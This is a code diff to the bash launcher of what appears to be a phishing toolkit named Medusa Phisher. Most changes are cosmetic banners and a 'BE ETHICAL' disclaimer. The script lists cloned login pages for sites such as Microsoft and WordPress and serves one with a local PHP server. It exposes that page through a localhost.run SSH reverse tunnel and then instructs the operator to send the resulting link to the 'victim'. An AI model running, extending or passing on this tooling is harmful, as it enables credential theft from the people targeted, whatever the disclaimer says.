@@ -3,11 +3,52 @@
 # Author: Adrilaw
 # GitHub: github.com/Adrilaw
 
+
+
+#!/bin/bash
+
+# Define text colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+NC='\033[0m' # No Color
+
+# Function to clear the terminal
+clear_terminal() {
+    clear
+}
+
+big_welcome() {
+    echo -e "${RED} __    __    ___  _        __   ___   ___ ___    ___      __ __   ____    __  __  _    ___  ____  ${NC}"
+    echo -e "${RED}|  |__|  |  /  _]| |      /  ] /   \ |   |   |  /  _]    |  |  | /    |  /  ]|  |/ ]  /  _]|    \ ${NC}"
+    echo -e "${RED}|  |  |  | /  [_ | |     /  / |     || _   _ | /  [_     |  |  ||  o  | /  / |  ' /  /  [_ |  D  )${NC}"
+    echo -e "${RED}|  |  |  ||    _]| |___ /  /  |  O  ||  \_/  ||    _]    |  _  ||     |/  /  |    \ |    _]|    / ${NC}"
+    echo -e "${RED}|  \`  '  ||   [_ |     /   \_ |     ||   |   ||   [_     |  |  ||  _  /   \_ |     ||   [_ |    \ ${NC}"
+    echo -e "${RED} \      / |     ||     \     ||     ||   |   ||     |    |  |  ||  |  \     ||  .  ||     ||  .  \${NC}"
+    echo -e "${RED}  \_/\_/  |_____||_____|\____| \___/ |___|___||_____|    |__|__||__|__|\____||__|\_||_____||__|\_${NC}"
+}
+
+
+# Clear the terminal
+clear_terminal
+
+# Display the big welcome message
+big_welcome
+
+# Execute Medusa Phisher
+./medusa_phisher.sh
+
+
+
+
+
+# Function to open author's GitHub page
 open_page() {
     url="https://github.com/Adrilaw"
     open "$url"
 }
 
+# Function to get dependencies list
 get_dependencies_list() {
     local dependencies=()
 
@@ -32,12 +73,21 @@ get_dependencies_list() {
     echo "${dependencies[@]}"
 }
 
+# Function to print a colored line
+print_colored_line() {
+    echo -e "\e[1;34m-------------------------------------------------------------------\e[0m"
+}
+
 # Call the function to get the dependencies list
 dependencies_list=$(get_dependencies_list)
 
-# Print the dependencies list
-echo "Dependencies list:"
+# Print the dependencies list with a colored line above
+print_colored_line
+echo -e "\e[1;33mDependencies list:\e[0m"
 echo "$dependencies_list"
+print_colored_line
+
+
 
 start_server() {
     server=$1
@@ -56,7 +106,7 @@ menu() {
 echo -e "\e[1;94m"
 echo "                          __  __          _                   ____  _     _     _  "
 echo "                         |  \/  | ___  __| |_   _ ___  __ _  |  _ \| |__ (_)___| |__   ___ _ __  "
-echo "                         |  |\/| |/ _ \/ _\` | | | / __|/ _\` | | |_) | '_ \| / __| '_ \ / _ \ '__| "
+echo "                         | |\/| |/ _ \/ _\`| | | / __|/ _\`| | |_) | '_ \| / __| '_ \ / _ \ '__| "
 echo "                         | |  | |  __/ (_| | |_| \__ \ (_| | |  __/| | | | \__ \ | | |  __/ |  "  
 echo "                         |_|  |_|\___|\__,_|\__,_|___/\__,_| |_|   |_| |_|_|___/_| |_|\___|_|  CODED BY: Adrilaw Github: https://github.com/Adrilaw"
 echo -e "\e[1;33m"
@@ -80,7 +130,7 @@ printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Wordpress\e[0m      
 printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m devianART   \e[0m            \n"
 
 # Add the coded by line
-printf "                                                \e[1;94m CODED BY: @Adrilaw CREDIT TO: https://github.com/8L4NK/blackeye/\e[0m\n"
+printf "                                                \e[1;94m CODED BY: @Adrilaw  CREDIT TO FOR SITES TEMPLETE: https://github.com/8L4NK/blackeye/\e[0m\n"
 
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
@@ -242,12 +292,34 @@ stop() {
 banner() {
     printf "\n"
     printf "\e[1;93m#############################################\e[0m\n"
-    printf "\e[1;93m#       BE ETHICAL                          #\e[0m\n"
-    printf "\e[1;93m#  :) :) :) :) :) :) :) :) :) :) :)         #\e[0m\n"
+    printf "\e[1;93m#             BE ETHICAL                    #\e[0m\n"
+    printf "\e[1;93m#                                           #\e[0m\n"
+    printf "\e[1;93m#                                           #\e[0m\n"
+    printf "\e[1;93m#            :) :) :) :) :) :) :)           #\e[0m\n"
+    printf "\e[1;93m#                                           #\e[0m\n"
+    printf "\e[1;93m#     With great power comes great          #\e[0m\n"
+    printf "\e[1;93m#          responsibility                   #\e[0m\n"
+    printf "\e[1;93m#                                           #\e[0m\n"
+    printf "\e[1;93m#             .--.                          #\e[0m\n"
+    printf "\e[1;93m#            |o_o |                         #\e[0m\n"
+    printf "\e[1;93m#            |:_/ |                         #\e[0m\n"
+    printf "\e[1;93m#           //   \ \                        #\e[0m\n"
+    printf "\e[1;93m#          (|     | )                       #\e[0m\n"
+    printf "\e[1;93m#         /'\_   _/ \                       #\e[0m\n"
+    printf "\e[1;93m#         \___)=(___/                       #\e[0m\n"
+    printf "\e[1;93m#                                           #\e[0m\n"
+    printf "\e[1;93m#  I'M NOT RESPONSIBLE FOR MISUSE OF SCRIPT #\e[0m\n"
     printf "\e[1;93m#                                           #\e[0m\n"
     printf "\e[1;93m#############################################\e[0m\n"
     printf "\n"
 }
+
+
+
+
+
+
+
 
 
 createpage() {
@@ -323,7 +395,7 @@ start() {
     printf "\n"
     printf "1. \e[1;94mLocalhost.run\e[0m\n"  # Adding color to "Localhost.run"
     echo ""
-    read -p $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m â”Œâ”€[ Choose the tunneling method:]â”€[~] â””â”€â”€â•¼ ~ ' host
+   read -p $'\n\e[1;92m┌──[ Choose the tunneling method: ]──┐\e[0m\n\e[1;92m│                                   │\e[0m\n\e[1;92m└─► ' host
 
     if [[ $host == 1 ]]; then
         xterm -e "bash -c 'printf \"Starting Localhost.run link...\n\"; ssh -R 80:localhost:5555 nokey@localhost.run'" &
@@ -347,7 +419,8 @@ start_localhostrun() {
         cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
         sleep 2
 
-        printf "\e[1;92m[\e[0m*\e[1;92m] Send the link in xterm to the  Victim the link is written as https://<link>.lhr.life\e[0m\e[1;77m %s\e[0m\n" 
+        printf "\e[1;92m[\e[0m*\e[1;92m] Please send the following link displayed in the xterm terminal to the victim it is output as: \e[0m\e[1;94mhttps://<link>.lhr.life\e[0m\n"
+
 
         # Waiting for victim to open link
         printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for victim to open the link...\e[0m\n"
